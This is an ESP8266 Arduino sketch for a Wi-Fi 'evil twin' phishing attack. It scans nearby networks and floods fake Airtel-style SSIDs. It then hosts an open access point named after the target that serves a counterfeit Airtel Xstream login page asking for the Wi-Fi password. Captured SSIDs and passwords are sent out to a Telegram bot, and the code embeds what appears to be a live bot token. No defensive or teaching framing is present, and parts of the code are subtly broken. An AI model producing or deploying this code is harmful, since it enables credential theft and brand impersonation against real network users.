#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <WiFiManager.h>

// Configuration
const char* TELEGRAM_BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";  // Replace with your bot token
const char* TELEGRAM_CHAT_ID = "8560004612";     // Replace with your chat ID
const int LED_PIN = LED_BUILTIN;                        // Built-in LED
const int MAX_FAKE_SSIDS = 40;
String targetSSID = "";
String targetBSSID = "";
String capturedPassword = "";
String capturedSSID = "";

// Fake SSID variations
String fakeSSIDs[40] = {
  "Airtel_Xtream_5G", "Airtel_Fiber_Pro", "Airtel_5G_Home", "Airtel_Ultra_Fast",
  "Airtel_Xstream_Pro", "Airtel_Fiber_5G", "Airtel_Home_WiFi", "Airtel_Super_Fast",
  "Airtel_5G_Pro", "Airtel_Fiber_Xtream", "Airtel_Hypernet", "Airtel_Quantum",
  "Airtel_Mega_Fiber", "Airtel_5G_Max", "Airtel_Fiber_Plus", "Airtel_Xtream_Fiber",
  "Airtel_5G_Hub", "Airtel_Fiber_Elite", "Airtel_Ultra_5G", "Airtel_Fast_Fiber",
  "Airtel_Xtream_Home", "Airtel_5G_Fiber", "Airtel_Pro_Max", "Airtel_Fiber_Hub",
  "Airtel_5G_Xtream", "Airtel_Fiber_Speed", "Airtel_Home_5G", "Airtel_Xstream_5G",
  "Airtel_Fiber_Fast", "Airtel_5G_Elite", "Airtel_Xtream_Fast", "Airtel_Fiber_Max",
  "Airtel_5G_Pro_Max", "Airtel_Hyper_Fiber", "Airtel_Xstream_Hub", "Airtel_Fiber_5G_Pro",
  "Airtel_5G_Super", "Airtel_Xtream_Elite", "Airtel_Fiber_Quantum", "Airtel_5G_Ultra"
};

// Web server for fake login page
ESP8266WebServer server(80);

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);  // LED off initially
  
  // Initialize EEPROM
  EEPROM.begin(512);
  
  Serial.println("ESP8266 WiFi Evil Twin + BruteForce Scanner Starting...");
  delay(2000);
  
  // Start scanning for biggest SSID
  scanAndSelectTarget();
}

void loop() {
  server.handleClient();
  
  // If we have target, start attack
  if (targetSSID.length() > 0 && fakeSSIDs[0].indexOf(targetSSID) == -1) {
    startEvilTwinAttack();
  }
  
  delay(100);
}

void scanAndSelectTarget() {
  Serial.println("Scanning WiFi networks...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int networks = WiFi.scanNetworks();
  String biggestSSID = "";
  int maxLength = 0;
  
  Serial.println("Available networks:");
  for (int i = 0; i < networks; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    Serial.printf("%d: %s (%d%%) %s\n", i + 1, ssid.c_str(), len, WiFi.RSSI(i) > -60 ? "STRONG" : "");
    
    if (len > maxLength && len > 5 && !ssid.startsWith("ESP") && !ssid.startsWith("pwned")) {
      maxLength = len;
      biggestSSID = ssid;
      targetBSSID = WiFi.BSSIDstr(i);
    }
  }
  
  if (biggestSSID.length() > 0) {
    targetSSID = biggestSSID;
    Serial.printf("TARGET SELECTED: %s (Length: %d)\n", targetSSID.c_str(), maxLength);
    
    // Generate fake SSIDs based on target
    generateFakeSSIDs(targetSSID);
    
    // Send target info to Telegram
    sendTelegramMessage("🎯 TARGET LOCKED: " + targetSSID + " | BSSID: " + targetBSSID);
  } else {
    Serial.println("No suitable target found. Rescanning in 30s...");
    delay(30000);
    scanAndSelectTarget();
  }
}

void generateFakeSSIDs(String original) {
  for (int i = 0; i < MAX_FAKE_SSIDS; i++) {
    fakeSSIDs[i] = original.substring(0, original.length() > 10 ? 10 : original.length()) + "_" + String(random(1000, 9999));
  }
}

void startEvilTwinAttack() {
  Serial.println("Starting Evil Twin Flood + Phishing...");
  
  // Create Soft AP with fake SSIDs (flood mode)
  WiFi.mode(WIFI_AP_STA);
  
  // Flood with 40 fake SSIDs (ESP8266 limit ~4 simultaneous, so channel hopping)
  floodFakeNetworks();
  
  // Main phishing AP with original SSID name
  WiFi.softAP(targetSSID.c_str(), "");  // Open network
  
  Serial.println("Phishing AP started: " + targetSSID);
  Serial.println("Login page: http://" + WiFi.softAPIP().toString());
  
  // Start fake Airtel login page
  server.on("/", handleLoginPage);
  server.on("/login", handleLoginPost);
  server.on("/style.css", handleCSS);
  server.on("/airtel.png", handleLogo);
  
  sendTelegramMessage("🚀 Evil Twin Active: " + targetSSID + " | Clients will see fake login");
}

void floodFakeNetworks() {
  for (int i = 0; i < MAX_FAKE_SSIDs; i++) {
    WiFi.softAP(fakeSSIDs[i].c_str());
    delay(500);  // Quick channel hop
  }
}

void handleLoginPage() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Airtel Xstream - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="/airtel.png" alt="Airtel">
        </div>
        <h2>Airtel Xstream WiFi</h2>
        <form action="/login" method="POST">
            <input type="text" name="ssid" placeholder="WiFi Name (SSID)" value=")" + targetSSID + R"(" required>
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="footer">Secure Connection | Airtel Fiber</p>
    </div>
</body>
</html>
  )rawliteral";
  server.send(200, "text/html", html);
}

void handleLoginPost() {
  capturedSSID = server.arg("ssid");
  capturedPassword = server.arg("password");
  
  Serial.printf("🎣 CREDENTIALS CAPTURED!\nSSID: %s\nPassword: %s\n", capturedSSID.c_str(), capturedPassword.c_str());
  
  // Send to Telegram immediately
  String message = "🔥 PASSWORD STEALED!\n📶 SSID: " + capturedSSID + "\n🔑 Password: " + capturedPassword + "\n📍 BSSID: " + targetBSSID;
  sendTelegramMessage(message);
  
  // Success page
  String success = R"rawliteral(
<!DOCTYPE html>
<html><head><meta http-equiv="refresh" content="3;url=http://google.com"></head>
<body><h2>Connected Successfully! Redirecting...</h2></body></html>
  )rawliteral";
  server.send(200, "text/html", success);
  
  // Blink LED 40 times (success signal)
  blinkLED40Times();
}

void handleCSS() {
  String css = R"rawliteral(
body { font-family: Arial; background: linear-gradient(45deg, #ff6b35, #f7931e); color: white; }
.container { max-width: 400px; margin: 100px auto; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; }
input { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; }
button { width: 100%; padding: 15px; background: #00a651; color: white; border: none; border-radius: 8px; font-size: 18px; }
.logo img { width: 100px; display: block; margin: 0 auto 20px; }
  )rawliteral";
  server.send(200, "text/css", css);
}

void handleLogo() {
  // Simple Airtel-like logo (base64 or simple SVG)
  String logo = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTAwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjRkY2QjM1Ii8+Cjx0ZXh0IHg9IjUwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE4IiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QUlSVFVMPC90ZXh0Pgo8L3N2Zz4K";
  server.sendHeader("Location", logo, true);
  server.send(302);
}

void sendTelegramMessage(String message) {
  if (WiFi.status() == WL_CONNECTED) {
    HTTPClient http;
    http.begin("https://api.telegram.org/bot" + String(TELEGRAM_BOT_TOKEN) + "/sendMessage?chat_id=" + String(TELEGRAM_CHAT_ID) + "&text=" + urlEncode(message));
    http.GET();
    http.end();
  }
}

void blinkLED40Times() {
  for (int i = 0; i < 40; i++) {
    digitalWrite(LED_PIN, LOW);   // LED on
    delay(100);
    digitalWrite(LED_PIN, HIGH);  // LED off
    delay(100);
  }
  Serial.println("✅ ATTACK COMPLETE! LED blinked 40 times. Device ready for shutdown.");
  sendTelegramMessage("✅ MISSION COMPLETE! 40 blinks done. Credentials captured successfully.");
  
  // Keep phishing server running
  while(true) {
    server.handleClient();
    delay(100);
  }
}

String urlEncode(String str) {
  String encodedString = "";
  char c;
  char code0;
  char code1;
  
  for (int i = 0; i < str.length(); i++) {
    c = str.charAt(i);
    if (c == ' ') {
      encodedString += '+';
    } else if (isAlphaNumeric(c)) {
      encodedString += c;
    } else {
      code1 = (c & 0xf) + '0';
      if ((c & 0xf) > 9) {
        code1 = (c & 0xf) - 10 + 'A';
      }
      c = (c >> 4) & 0xf;
      code0 = c + '0';
      if (c > 9) {
        code0 = c - 10 + 'A';
      }
      encodedString += '%';
      encodedString += code0;
      encodedString += code1;
    }
    yield();
  }
  return encodedString;
}
